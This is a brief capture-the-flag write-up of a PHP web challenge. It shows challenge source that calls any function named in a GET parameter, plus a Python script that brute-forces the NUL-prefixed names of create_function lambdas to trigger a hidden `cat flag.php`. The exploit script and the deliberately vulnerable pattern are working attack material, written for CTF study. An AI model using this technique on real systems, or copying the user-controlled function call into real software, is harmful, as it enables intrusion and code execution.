![](<./img/Pasted image 20230226131534.png>)

```php
<?php

$MY = create_function("","die(`cat flag.php`);");
$hash = bin2hex(openssl_random_pseudo_bytes(32));
eval("function SUCTF_$hash(){"
    ."global \$MY;"
    ."\$MY();"
    ."}");
if(isset($_GET['func_name'])){
    $_GET["func_name"]();
    die();
}
show_source(__FILE__); 
```

创建了一个匿名函数，匿名函数以`<NUL>lambda_<num>`命名，直接爆破

```python
import requests

url = 'http://6a737906-4926-47a2-8b0e-8b51cac68f8e.node4.buuoj.cn:81/?func_name=%00lambda_{}'

for i in range(10000):
    response = requests.get(url.format(i))
    print("{}: {}".format(i, response.status_code))
    if response.status_code == 200:
        print(response.text)
        break
```

![](<./img/Pasted image 20230226134442.png>)

#Web #PHP #lambda